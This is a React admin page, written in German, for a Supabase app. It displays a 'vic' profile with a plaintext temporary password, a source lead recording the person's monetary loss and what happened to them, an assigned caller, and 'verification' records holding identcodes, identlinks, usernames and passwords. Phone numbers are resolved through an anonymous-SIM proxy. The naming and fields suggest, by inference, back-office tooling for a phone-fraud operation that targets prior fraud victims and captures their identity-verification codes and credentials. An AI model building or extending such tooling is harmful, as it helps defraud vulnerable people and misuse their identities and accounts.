import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { ArrowLeft, Loader2, Send, Copy, StickyNote, ShieldCheck, Inbox, ExternalLink, Pencil } from "lucide-react";
import { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { AssignmentStatusBadge, type AssignmentStatus } from "@/components/AssignmentStatusBadge";
import VerificationLogo from "@/components/VerificationLogo";
import AssignCallerSelect from "@/components/AssignCallerSelect";
import {
  formatDateTime,
  formatEur,
  statusMeta,
  type Lead,
  type LeadNote,
} from "@/lib/leads";
import { notifyTelegram } from "@/lib/telegramNotify";


interface VerificationAssignment {
  id: string;
  field_values: Record<string, string>;
  phone_number_id: string | null;
  created_at: string;
  status: AssignmentStatus;
  verification: {
    title: string;
    logo_url: string | null;
    required_fields: string[];
  };
}

const FIELD_LABELS: Record<string, string> = {
  identcode: "Identcode",
  identlink: "Identlink",
  email: "Email",
  username: "Anmeldename",
  password: "Passwort",
  phone: "Telefonnummer",
};

interface VicProfile {
  id: string;
  email: string | null;
  first_name: string | null;
  last_name: string | null;
  phone: string | null;
  temp_password: string | null;
  created_at: string;
  source_lead_id: string | null;
  assigned_caller_id: string | null;
  member_status: string | null;
}


interface UserNote {
  id: string;
  content: string;
  created_at: string;
  author_id: string;
}

interface AuthorMap {
  [key: string]: string;
}

export default function AdminVicDetail() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const { user } = useAuth();
  const { toast } = useToast();

  const [profile, setProfile] = useState<VicProfile | null>(null);
  const [notes, setNotes] = useState<UserNote[]>([]);
  const [authorEmails, setAuthorEmails] = useState<AuthorMap>({});
  const [assignments, setAssignments] = useState<VerificationAssignment[]>([]);
  const [assignmentPhones, setAssignmentPhones] = useState<Record<string, string>>({});
  const [sourceLead, setSourceLead] = useState<Lead | null>(null);
  const [leadNotes, setLeadNotes] = useState<LeadNote[]>([]);
  const [leadAuthorEmails, setLeadAuthorEmails] = useState<AuthorMap>({});
  const [loading, setLoading] = useState(true);
  const [noteText, setNoteText] = useState("");
  const [submitting, setSubmitting] = useState(false);


  const fetchData = async () => {
    if (!id) return;
    setLoading(true);

    const [profileRes, notesRes, assignRes] = await Promise.all([
      supabase.from("profiles").select("*").eq("id", id).maybeSingle(),
      supabase.from("user_notes").select("*").eq("user_id", id).order("created_at", { ascending: false }),
      supabase.from("verification_assignments").select("id, field_values, phone_number_id, created_at, status, verification:verifications(title, logo_url, required_fields)").eq("user_id", id).order("created_at", { ascending: false }),
    ]);

    const fetchedProfile = profileRes.data as VicProfile | null;
    setProfile(fetchedProfile);
    const fetchedNotes = (notesRes.data as UserNote[]) ?? [];
    setNotes(fetchedNotes);

    // Source lead (only when this vic was imported from a lead)
    if (fetchedProfile?.source_lead_id) {
      const leadId = fetchedProfile.source_lead_id;
      const [leadRes, leadNotesRes] = await Promise.all([
        supabase.from("leads").select("*").eq("id", leadId).maybeSingle(),
        supabase.from("lead_notes").select("*").eq("lead_id", leadId).order("created_at", { ascending: true }),
      ]);
      setSourceLead((leadRes.data as Lead) ?? null);
      const fetchedLeadNotes = (leadNotesRes.data as LeadNote[]) ?? [];
      setLeadNotes(fetchedLeadNotes);

      const leadAuthorIds = [...new Set(fetchedLeadNotes.map((n) => n.author_id).filter(Boolean))] as string[];
      if (leadAuthorIds.length > 0) {
        const { data: leadAuthors } = await supabase.from("profiles").select("id, email").in("id", leadAuthorIds);
        const leadMap: AuthorMap = {};
        (leadAuthors ?? []).forEach((a: any) => { leadMap[a.id] = a.email ?? "Unbekannt"; });
        setLeadAuthorEmails(leadMap);
      }
    } else {
      setSourceLead(null);
      setLeadNotes([]);
    }


    // Assignments
    const fetchedAssignments = (assignRes.data ?? []).map((a: any) => ({
      ...a,
      verification: a.verification,
      field_values: a.field_values as Record<string, string>,
    })) as VerificationAssignment[];
    setAssignments(fetchedAssignments);

    // Fetch phone numbers for assignments
    const phoneIds = fetchedAssignments.map((a) => a.phone_number_id).filter(Boolean) as string[];
    if (phoneIds.length > 0) {
      const { data: phones } = await supabase.from("phone_numbers").select("id, token").in("id", phoneIds);
      const phoneMap: Record<string, string> = {};
      await Promise.all(
        (phones ?? []).map(async (p: any) => {
          try {
            const { data: proxyData } = await supabase.functions.invoke("anosim-proxy", { body: { token: p.token } });
            phoneMap[p.id] = proxyData?.number || p.token;
          } catch {
            phoneMap[p.id] = p.token;
          }
        })
      );
      setAssignmentPhones(phoneMap);
    }

    // Fetch author emails
    const authorIds = [...new Set(fetchedNotes.map((n) => n.author_id))];
    if (authorIds.length > 0) {
      const { data: authors } = await supabase
        .from("profiles")
        .select("id, email")
        .in("id", authorIds);
      const map: AuthorMap = {};
      (authors ?? []).forEach((a: any) => { map[a.id] = a.email ?? "Unbekannt"; });
      setAuthorEmails(map);
    }

    setLoading(false);
  };

  useEffect(() => {
    fetchData();
  }, [id]);

  const handleAddNote = async () => {
    if (!noteText.trim() || !id || !user) return;
    setSubmitting(true);

    const { error } = await supabase.from("user_notes").insert({
      user_id: id,
      author_id: user.id,
      content: noteText.trim(),
    });

    if (error) {
      toast({ title: "Fehler", description: "Notiz konnte nicht gespeichert werden.", variant: "destructive" });
    } else {
      toast({ title: "Gespeichert", description: "Notiz wurde hinzugefügt." });
      const savedText = noteText.trim();
      notifyTelegram("vic_note_added", {
        vic_name: `${profile?.first_name ?? ""} ${profile?.last_name ?? ""}`.trim() || "Unbekannt",
        vic_email: profile?.email ?? null,
        content: savedText,
      });
      setNoteText("");
      fetchData();
    }
    setSubmitting(false);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Kopiert", description: "In Zwischenablage kopiert." });
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  if (!profile) {
    return (
      <div className="space-y-4">
        <Button variant="ghost" onClick={() => navigate("/admin/vics")} className="gap-2">
          <ArrowLeft className="w-4 h-4" /> Zurück
        </Button>
        <p className="text-muted-foreground">Nutzer nicht gefunden.</p>
      </div>
    );
  }

  const infoItems = [
    { label: "Vorname", value: profile.first_name },
    { label: "Nachname", value: profile.last_name },
    { label: "Email", value: profile.email },
    { label: "Telefon", value: profile.phone },
    { label: "Erstellt am", value: new Date(profile.created_at).toLocaleDateString("de-DE", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" }) },
  ];

  return (
    <div className="space-y-6">
      <Button variant="ghost" onClick={() => navigate("/admin/vics")} className="gap-2 -ml-3">
        <ArrowLeft className="w-4 h-4" /> Zurück zur Übersicht
      </Button>

      {/* Profile Card */}
      <Card>
        <CardHeader className="flex flex-row items-start justify-between gap-4">
          <div className="flex items-center gap-3">
            <CardTitle className="text-lg">
              {profile.first_name} {profile.last_name}
            </CardTitle>
            <Badge variant="secondary" className={profile.member_status === "aktiv" ? "bg-emerald-100 text-emerald-800" : "bg-amber-100 text-amber-800"}>
              {profile.member_status === "aktiv" ? "Aktiv" : "In Bearbeitung"}
            </Badge>
          </div>
          <AssignCallerSelect
            target="profile"
            targetId={profile.id}
            value={profile.assigned_caller_id}
            onChange={(v) => setProfile((p) => (p ? { ...p, assigned_caller_id: v } : p))}
          />
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {infoItems.map((item) => (
              <div key={item.label}>
                <p className="text-xs text-muted-foreground mb-0.5">{item.label}</p>
                <p className="text-sm font-medium">{item.value || "–"}</p>
              </div>
            ))}
            <div>
              <p className="text-xs text-muted-foreground mb-0.5">Temp. Passwort</p>
              {profile.temp_password ? (
                <span className="inline-flex items-center gap-1.5">
                  <code className="bg-muted px-1.5 py-0.5 rounded text-xs font-mono">
                    {profile.temp_password}
                  </code>
                  <button
                    onClick={() => copyToClipboard(profile.temp_password!)}
                    className="text-muted-foreground hover:text-foreground transition-colors"
                  >
                    <Copy className="w-3.5 h-3.5" />
                  </button>
                </span>
              ) : (
                <p className="text-sm font-medium">–</p>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Source Lead */}
      {sourceLead && (
        <Card>
          <CardHeader>
            <CardTitle className="text-lg flex items-center gap-2">
              <Inbox className="w-5 h-5" /> Herkunft: Lead
              <Badge variant="secondary" className={statusMeta(sourceLead.status).className}>
                {statusMeta(sourceLead.status).label}
              </Badge>
              <Button
                variant="ghost"
                size="sm"
                className="ml-auto gap-1"
                onClick={() => navigate(`/admin/leads/${sourceLead.id}`)}
              >
                Zum Lead <ExternalLink className="w-3.5 h-3.5" />
              </Button>
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <p className="text-xs text-muted-foreground mb-0.5">Name</p>
                <p className="text-sm font-medium">{sourceLead.full_name || "–"}</p>
              </div>
              <div>
                <p className="text-xs text-muted-foreground mb-0.5">Email</p>
                <p className="text-sm font-medium">{sourceLead.email || "–"}</p>
              </div>
              <div>
                <p className="text-xs text-muted-foreground mb-0.5">Telefon</p>
                <p className="text-sm font-medium">{sourceLead.phone_number || "–"}</p>
              </div>
              <div>
                <p className="text-xs text-muted-foreground mb-0.5">Schadenshöhe</p>
                <p className="text-sm font-medium">{formatEur(sourceLead.schadenshoehe)}</p>
              </div>
              <div className="sm:col-span-2">
                <p className="text-xs text-muted-foreground mb-0.5">Importiert am</p>
                <p className="text-sm font-medium">{formatDateTime(sourceLead.imported_at)}</p>
              </div>
              <div className="sm:col-span-2">
                <p className="text-xs text-muted-foreground mb-0.5">Was ist vorgefallen?</p>
                <p className="text-sm whitespace-pre-wrap leading-relaxed">{sourceLead.vorfall || "–"}</p>
              </div>
            </div>

            <div>
              <p className="text-sm font-medium mb-2">Lead-Notizen</p>
              {leadNotes.length === 0 ? (
                <p className="text-sm text-muted-foreground">Keine Notizen zu diesem Lead.</p>
              ) : (
                <div className="space-y-2">
                  {leadNotes.map((n) => (
                    <div key={n.id} className="rounded-md border border-border bg-muted/40 p-3">
                      <p className="text-sm whitespace-pre-wrap">{n.content}</p>
                      <div className="flex items-center justify-between mt-2">
                        <p className="text-xs text-muted-foreground">
                          {n.author_id ? leadAuthorEmails[n.author_id] ?? "Unbekannt" : "System"}
                        </p>
                        <p className="text-xs text-muted-foreground">{formatDateTime(n.created_at)}</p>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      )}


      {/* Assigned Verifications */}
      <Card>
        <CardHeader>
          <CardTitle className="text-lg flex items-center gap-2">
            <ShieldCheck className="w-5 h-5" /> Zugewiesene Verifikationen
          </CardTitle>
        </CardHeader>
        <CardContent>
          {assignments.length === 0 ? (
            <p className="text-sm text-muted-foreground text-center py-4">Keine Verifikationen zugewiesen.</p>
          ) : (
            <div className="space-y-3">
              {assignments.map((a) => (
                <div key={a.id} className="rounded-md border border-border bg-muted/40 p-3">
                  <div className="flex items-center gap-3 mb-2">
                    <VerificationLogo
                      value={a.verification?.logo_url ?? null}
                      alt={a.verification?.title ?? ""}
                      className="w-8 h-8 rounded object-contain"
                      fallback={<div className="w-8 h-8 rounded bg-muted flex items-center justify-center text-xs text-muted-foreground">Logo</div>}
                    />
                    <span className="font-medium text-sm">{a.verification?.title ?? "–"}</span>
                    <AssignmentStatusBadge status={a.status} />
                    <span className="text-xs text-muted-foreground ml-auto">
                      {new Date(a.created_at).toLocaleDateString("de-DE", { day: "2-digit", month: "2-digit", year: "numeric" })}
                    </span>
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    {Object.entries(a.field_values).map(([key, val]) => (
                      <div key={key}>
                        <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] || key}</p>
                        <p className="text-sm">{val || "–"}</p>
                      </div>
                    ))}
                    {a.phone_number_id && (
                      <div>
                        <p className="text-xs text-muted-foreground">Telefonnummer</p>
                        <p className="text-sm">{assignmentPhones[a.phone_number_id] || "Laden..."}</p>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>

      {/* Notes Section */}
      <Card>
        <CardHeader>
          <CardTitle className="text-lg flex items-center gap-2">
            <StickyNote className="w-5 h-5" /> Notizen
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Add note */}
          <div className="flex gap-2">
            <Textarea
              value={noteText}
              onChange={(e) => setNoteText(e.target.value)}
              placeholder="Neue Notiz hinzufügen…"
              className="min-h-[80px] resize-none"
            />
            <Button
              onClick={handleAddNote}
              disabled={submitting || !noteText.trim()}
              size="icon"
              className="shrink-0 self-end h-10 w-10"
            >
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
            </Button>
          </div>

          {/* Notes list */}
          {notes.length === 0 ? (
            <p className="text-sm text-muted-foreground text-center py-4">Noch keine Notizen vorhanden.</p>
          ) : (
            <div className="space-y-3">
              {notes.map((note) => (
                <div key={note.id} className="rounded-md border border-border bg-muted/40 p-3">
                  <p className="text-sm whitespace-pre-wrap">{note.content}</p>
                  <div className="flex items-center justify-between mt-2">
                    <p className="text-xs text-muted-foreground">
                      {authorEmails[note.author_id] ?? "Unbekannt"}
                    </p>
                    <p className="text-xs text-muted-foreground">
                      {new Date(note.created_at).toLocaleDateString("de-DE", {
                        day: "2-digit",
                        month: "2-digit",
                        year: "numeric",
                        hour: "2-digit",
                        minute: "2-digit",
                      })}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
